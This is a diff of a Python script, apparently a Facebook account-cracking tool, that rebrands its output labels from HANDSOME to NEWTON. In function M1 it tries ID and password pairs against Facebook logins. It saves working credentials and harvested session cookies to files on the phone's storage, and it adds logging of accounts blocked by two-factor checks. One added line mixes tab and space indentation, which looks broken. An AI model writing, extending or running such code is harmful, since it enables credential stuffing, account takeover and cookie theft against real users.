@@ -1,4 +1,3 @@
-
 from os import path
 from urllib.request import urlopen
 import os,base64,zlib,pip,urllib,platform,math,shutil,random,uuid,string,hashlib,json,sys
@@ -660,24 +659,25 @@ def M1(ids,names,passlist):
                                 q = json.loads(po)
                                 if 'session_key' in q:
                                         ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"                                	
-                                        print('\r\r\033[1;32m [HANDSOME-OK] '+ids+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/HANDSOMEYY_OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/HANDSOMEYY_COOKiE_M1.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
+                                        print('\r\r\033[1;32m [NEWTON-OK] '+ids+' | '+pas+'\033[1;97m')
+                                        open('/sdcard/NEWTON_OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/NEWTON_COOKiE_M1.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                                         HANDSOME(ids,pas,cookie)
                                         oks.append(ids)
                                         break
                                 elif twf in str(po):
                                         if 'y' in pcp:
                                                 print('\r\r \033[1;34m[2F-LAXA] '+ids+' | '+pas)
+						open('/sdcard/NEWTON_2F.txt', 'a').write(ids+'|'+pas+'\n')
                                                 twf.append(ids)
                                                 break
                                 elif 'www.facebook.com' in q['error']['message']:
                                         if 'y' in pcp:
-                                                print('\r\r\x1b[1;91m [HANFSOME-CP] '+ids+' | '+pas+'\033[1;97m')
-                                                open('/sdcard/HANDSOME_CP.txt', 'a').write(ids+'|'+pas+'\n')
+                                                print('\r\r\x1b[1;91m [NEWTON-CP] '+ids+' | '+pas+'\033[1;97m')
+                                                open('/sdcard/NEWTON_CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                 cps.append(ids)
                                                 break
                                         else:
-                                                open('/sdcard/HANDSOME_CP.txt','a').write(ids+'|'+pas+'\n')
+                                                open('/sdcard/NEWTON_CP.txt','a').write(ids+'|'+pas+'\n')
                                                 break
                                 else:
                                         continue
